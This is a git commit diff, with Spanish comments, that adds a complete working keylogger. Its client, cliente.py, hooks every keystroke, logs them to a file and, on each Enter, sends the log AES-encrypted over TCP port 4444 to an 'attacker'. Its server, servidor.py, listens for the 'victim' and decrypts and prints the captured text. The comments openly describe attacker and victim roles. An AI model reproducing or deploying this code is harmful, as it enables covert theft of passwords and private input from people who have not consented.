853390f6952774b568421c54d9b3adaeaa7ae694
Ian Garcia <iangarcia.ig11@gmail.com>
2021-07-04 22:33:37 -0400

    Archivos

---
+++ cliente.py
@@ -0,0 +1,101 @@
+# Libreria que provee funciones para interactuar con el sistema operativo
+import os
+# Libreria que captura las llamadas del mouse y del teclado en el sistema.
+import pyxhook
+# Libreria necesaria para codificar y descodificar
+from base64 import b64encode, b64decode
+# Libreria utilizada para generar la clave secreta 
+import hashlib
+# Libreria para encriptar el mensaje con AES
+from Cryptodome.Cipher import AES
+from Cryptodome.Random import get_random_bytes
+#Libraria para generar la conexión con el atacante
+import socket
+# Libraria usada para codificar y descodificar
+import json
+
+
+#Captura el evento de presionar una tecla y escribe en el archivo log.
+# ejemplo:
+# Si presiona 'enter' se envia el mensaje cifrado al atacante.
+# Si presiona 'Back space' (tecla para borrar) escibre en el archivo ' (DEL)'.
+# Si presiona 'espacio' o 'Tab' escribe un espacio ' '.
+# Si presiona cualquier otra tecla lo escribe una al lado de la otra.
+def capturaTeclado(event):
+    # abre archivo log 
+    file = open(archivoLog, 'a') 
+
+    try:
+        # Escribe en el archivo con las diferentes formas mencionadas
+        if( event.Key == 'Return'):
+            enviarMensaje()
+        elif (event.Key == 'BackSpace'): 
+            file.write(' (DEL)')
+        elif(event.Key == 'space' or event.Key == 'Tab' ):
+            file.write(' ')
+        else:
+            file.write('{}'.format(event.Key))
+
+    finally:
+        # cierra el archivo.
+        file.close()
+
+# Envia el mensaje cifrado con AES-256 al atacante. 
+def enviarMensaje():  
+    # abre archivo log
+    file = open(archivoLog, "r")
+    # Envia el mensaje encriptado a traves del socket
+    sock.sendall(json.dumps(encriptar(file.read(), "hola")).encode())
+    # cierra el archivo log
+    file.close()
+    # abre el archivo log para vaciar el contenido.
+    file = open(archivoLog, "w")
+    # cierra el archivo log
+    file.close()
+
+
+# Encripta el mensaje dado un texto y una contraseña
+def encriptar(mensaje, clave):
+    # Genera un valor aleatorio dado el numero de bloque del objeto AES (16)
+    salt = get_random_bytes(AES.block_size)
+
+    # Genera un clave privada utlizando el scrypt KDF
+    clavePrivada = hashlib.scrypt(
+        clave.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)
+
+    # configura el cifrado 
+    configCifrado = AES.new(clavePrivada, AES.MODE_GCM)
+
+    # Retorna un diccionario con el texto encriptado
+    textoCifrado, etiqueta = configCifrado.encrypt_and_digest(bytes(mensaje, 'utf-8'))
+    return {
+        'textoCifrado': b64encode(textoCifrado).decode('utf-8'),
+        'salt': b64encode(salt).decode('utf-8'),
+        'nonce': b64encode(configCifrado.nonce).decode('utf-8'),
+        'etiqueta': b64encode(etiqueta).decode('utf-8')
+    } 
+
+
+# Indica el directorio del archivo log
+archivoLog = os.environ.get(
+    'pylogger_file',
+    os.path.expanduser('~/Desktop/file.log')
+)
+
+
+# Crea un socket TCP/IP 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# conecta el socket al puerto 4444 y a la ip del atacante
+direccionServidor = ('127.0.0.1', 4444)
+print('conectando a {} por el puerto {}'.format(*direccionServidor))
+sock.connect(direccionServidor)
+
+# Se define el objecto que maneja las capturas de eventos como mouse o teclado
+eventos = pyxhook.HookManager()
+# Si se captura el evento de presionar una tecla se llama a la función capturaTeclado()
+eventos.KeyDown = capturaTeclado
+# Configura el objecto como un capturador de evento de teclado
+eventos.HookKeyboard()
+# Inicia la captura 
+eventos.start()  
---
+++ servidor.py
@@ -0,0 +1,60 @@
+# Libreria necesaria para codificar y descodificar
+from base64 import b64encode, b64decode
+# Libreria utilizada para generar la clave secreta 
+import hashlib
+# Libreria para encriptar el mensaje con AES
+from Cryptodome.Cipher import AES
+from Cryptodome.Random import get_random_bytes
+#Libraria para generar la conexión con el atacante
+import socket
+# Libraria usada para codificar y descodificar
+import json
+
+
+# Funcion que desencripta dado un diccionario codificado y una contraseña
+def decrypt(enc_dict, password):
+    # decodifica el diccionario en base 64 
+    salt = b64decode(enc_dict['salt'])
+    textoCifrado = b64decode(enc_dict['textoCifrado'])
+    nonce = b64decode(enc_dict['nonce'])
+    etiqueta = b64decode(enc_dict['etiqueta'])
+    
+
+    # genera la clave privada con la contrasena dada y el salt decodificado
+    private_key = hashlib.scrypt(
+        password.encode(), salt=salt, n=2**14, r=8, p=1, dklen=32)
+
+    # crear la configuración del cifrado AES-256, con los datos decodificados
+    cifrado = AES.new(private_key, AES.MODE_GCM, nonce=nonce)
+
+    # desencripta el texto cifrado con la configuración creada
+    decrypted = cifrado.decrypt_and_verify(textoCifrado, etiqueta)
+    #Retorna el texto desencriptado
+    return decrypted
+
+
+
+# Crea el socket TCP/IP 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# configura el socket del atacante 
+direccionServidor = ('192.168.1.49', 4444)
+print('Incia la conexión {} por el puerto {}'.format(*direccionServidor))
+sock.bind(direccionServidor)
+sock.listen(1)
+
+while True:
+    print('Esperando conexión')
+    conexion, direccionVictima = sock.accept()
+    try:
+        print('Cliente conectado:', direccionVictima)
+        while True:
+            data = conexion.recv(4096)
+            print('mensaje {!r}'.format(decrypt(json.loads(data), "hola")))
+            if data:
+                conexion.sendall(data)
+            else:
+                break
+    finally:
+        conexion.close()
+
